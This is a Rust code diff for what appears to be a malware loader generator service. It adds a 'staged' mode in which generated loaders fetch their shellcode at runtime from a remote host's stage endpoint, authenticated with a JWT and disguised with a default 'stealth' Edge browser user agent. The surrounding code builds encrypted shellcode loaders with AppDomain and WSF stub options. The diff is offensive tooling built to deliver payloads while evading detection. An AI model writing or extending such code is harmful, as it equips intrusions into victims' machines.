@@ -15,7 +15,7 @@ use template_engine::{
     generate_csharp_source, generate_appdomain_config, generate_wsf_stub_source,
     AppDomainTemplateConfig,
     Encryption, Feature, LoaderConfig, LoaderType, AppDomainConfig, WsfStubConfig,
-    OutputCategory,
+    OutputCategory, StagedConfig,
 };
 
 #[derive(Deserialize)]
@@ -29,6 +29,19 @@ pub struct AppDomainReq {
 fn default_clr_version() -> String { "v4.0.30319".into() }
 fn default_net_version()  -> String { "4.0".into() }
 
+#[derive(Deserialize, Default)]
+pub struct StagedReq {
+    pub pid:        String,
+    pub jwt:        String,
+    pub host:       String,
+    #[serde(default)]
+    pub user_agent: Option<String>,
+    #[serde(default = "default_scheme")]
+    pub scheme:     String,
+}
+
+fn default_scheme() -> String { "https".into() }
+
 #[derive(Deserialize)]
 pub struct GenerateRequest {
     pub loader_type:      String,
@@ -39,6 +52,8 @@ pub struct GenerateRequest {
     pub iv_hex:           String,
     pub pe_config:        Option<PeMetadata>,
     pub appdomain_config: Option<AppDomainReq>,
+    #[serde(default)]
+    pub staged:           Option<StagedReq>,
 }
 
 #[derive(Serialize)]
@@ -157,18 +172,54 @@ fn run_build(
     let key_hex = req.key_hex.replace(' ', "");
     let iv_hex  = req.iv_hex.replace(' ', "");
 
-    if !is_valid_hex(&sc_hex) || sc_hex.len() > 2_000_000 {
-        jobs.set_status(&job_id, JobStatus::Error { msg: "shellcode_hex: invalid or exceeds 1MB".into() });
-        return;
+    let is_staged_mode = req.staged.is_some();
+
+    // In staged mode, shellcode_hex can be empty — the loader fetches at runtime.
+    if !is_staged_mode {
+        if !is_valid_hex(&sc_hex) || sc_hex.len() > 2_000_000 {
+            jobs.set_status(&job_id, JobStatus::Error { msg: "shellcode_hex: invalid or exceeds 1MB".into() });
+            return;
+        }
+        if key_hex.len() != 64 || !is_valid_hex(&key_hex) {
+            jobs.set_status(&job_id, JobStatus::Error { msg: "key_hex must be exactly 64 hex chars (32 bytes)".into() });
+            return;
+        }
+        if iv_hex.len() != 32 || !is_valid_hex(&iv_hex) {
+            jobs.set_status(&job_id, JobStatus::Error { msg: "iv_hex must be exactly 32 hex chars (16 bytes)".into() });
+            return;
+        }
     }
-    if key_hex.len() != 64 || !is_valid_hex(&key_hex) {
-        jobs.set_status(&job_id, JobStatus::Error { msg: "key_hex must be exactly 64 hex chars (32 bytes)".into() });
-        return;
-    }
-    if iv_hex.len() != 32 || !is_valid_hex(&iv_hex) {
-        jobs.set_status(&job_id, JobStatus::Error { msg: "iv_hex must be exactly 32 hex chars (16 bytes)".into() });
-        return;
-    }
+
+    // ── Staged-mode validation & StagedConfig construction ──────────────────
+    let staged_cfg: Option<StagedConfig> = if let Some(s) = &req.staged {
+        // PID = 16 lowercase hex chars (server-generated)
+        if s.pid.len() != 16 || !s.pid.chars().all(|c| c.is_ascii_hexdigit()) {
+            jobs.set_status(&job_id, JobStatus::Error { msg: "staged.pid must be 16 hex chars".into() });
+            return;
+        }
+        // JWT roughly: header.payload.sig, all base64url
+        if s.jwt.is_empty() || s.jwt.len() > 4096 || s.jwt.matches('.').count() != 2 {
+            jobs.set_status(&job_id, JobStatus::Error { msg: "staged.jwt malformed".into() });
+            return;
+        }
+        // Host: allow alphanum, dot, dash, colon (port). Reject if path-traversal chars.
+        if s.host.is_empty() || s.host.len() > 256
+            || s.host.chars().any(|c| !(c.is_ascii_alphanumeric() || ".-:".contains(c)))
+        {
+            jobs.set_status(&job_id, JobStatus::Error { msg: "staged.host invalid".into() });
+            return;
+        }
+        let scheme = if s.scheme == "http" || s.scheme == "https" { &s.scheme } else { "https" };
+        let url = format!("{}://{}/api/v1/stage/{}", scheme, s.host, s.pid);
+        // Stealth UA — Edge on Win10 by default, or override
+        let ua = s.user_agent.as_deref().filter(|u| !u.is_empty()).unwrap_or(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
+             (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
+        ).to_string();
+        Some(StagedConfig { url, jwt: s.jwt.clone(), user_agent: ua })
+    } else {
+        None
+    };
 
     let appdomain_config = if loader_type == LoaderType::AppDomain {
         let req_ad = req.appdomain_config.unwrap_or(AppDomainReq {
@@ -202,13 +253,16 @@ fn run_build(
         loader_type,
         features,
         encryption,
-        shellcode_hex:    sc_hex,
-        key_hex,
-        iv_hex,
+        // Staged mode: shellcode/key/iv may be empty — the loader fetches at runtime.
+        // Provide harmless padding so template filters that expect non-empty hex don't trip.
+        shellcode_hex:    if is_staged_mode && sc_hex.is_empty()  { "00".into() } else { sc_hex },
+        key_hex:          if is_staged_mode && key_hex.is_empty() { "00".repeat(32) } else { key_hex },
+        iv_hex:           if is_staged_mode && iv_hex.is_empty()  { "00".repeat(16) } else { iv_hex },
         pe_config:        None,
         appdomain_config,
         wsf_stub_config,
         dotnet_stub_hex:  None,
+        staged:           staged_cfg,
     };
 
     jobs.set_status(&job_id, JobStatus::Building { progress: 10, msg: "Generating source...".into() });
